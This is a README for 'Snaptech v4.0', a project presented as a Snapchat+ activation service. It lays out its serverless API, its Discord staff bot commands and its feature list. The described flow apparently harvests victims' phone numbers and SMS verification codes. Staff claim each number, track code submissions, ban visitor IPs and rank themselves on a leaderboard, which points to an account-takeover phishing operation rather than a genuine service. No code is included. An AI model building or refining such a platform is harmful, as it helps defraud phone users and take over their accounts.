# Snaptech v4.0 — Snapchat+ Activation Platform

## Architecture

```
snaptech/
├── api/                    → Vercel serverless functions
│   ├── middleware.js       → IP ban middleware (reusable)
│   ├── check-ban.js        → Frontend ban check
│   ├── snapchat.js         → Register new request
│   ├── status.js           → Poll request status
│   ├── verify-code.js      → Verify SMS code
│   ├── staff-action.js     → Staff actions (claim/unclaim/validate)
│   ├── ban-ip.js           → Ban IP endpoint
│   └── stats.js            → Stats API (global/today/operators/hourly/leaderboard)
├── bot/                    → Discord bot (Railway/Render)
│   ├── bot.js              → Entry point
│   ├── package.json
│   └── src/
│       ├── config.js       → Environment config
│       ├── database.js     → DB helpers + stats queries
│       ├── commands.js     → Slash command definitions
│       ├── polling.js      → Pending + code_submitted polling
│       ├── utils/
│       │   ├── colors.js   → Operator colors
│       │   ├── formatters.js
│       │   └── embedBuilder.js
│       └── handlers/
│           ├── buttons.js  → Button interactions
│           └── slash.js    → Slash command handlers
├── index.html              → Main form
├── validation.html         → Waiting page
├── code.html               → Code entry
├── verify-wait.html        → Code verification waiting
├── success.html            → Success page
├── banned.html             → Banned IP page
├── style.css               → Global styles (responsive + GIF bg)
├── script.js               → Form logic
├── validation.js           → Status polling
├── code.js                 → OTP input
├── verify-wait.js          → Verification polling
├── vercel.json             → Vercel routing
└── package.json            → Site dependencies
```

## Bot Commands

| Command | Description |
|---------|-------------|
| `/config #channel` | Set log channel |
| `/panel` | Show staff panel |
| `/claim phone` | Claim a request |
| `/setlength phone length` | Set code length |
| `/wrongnumber phone` | Mark wrong number |
| `/banip ip` | Ban IP address |
| `/stats` | Global statistics |
| `/today` | Today's statistics |
| `/operators` | Operator distribution |
| `/activity [hours]` | Hourly activity chart |
| `/leaderboard [limit]` | Staff leaderboard |
| `/staffactivity` | Detailed staff activity |

## Features

- 🎨 Operator-colored embeds (SFR=red, Orange=orange, Bouygues=blue)
- 🚫 Full IP ban (site + API)
- 🔄 Unclaim button
- 📊 Real-time stats
- 📱 Fully responsive
- 🎃 Snapchat ghost animated background
- 🇬🇧 100% English
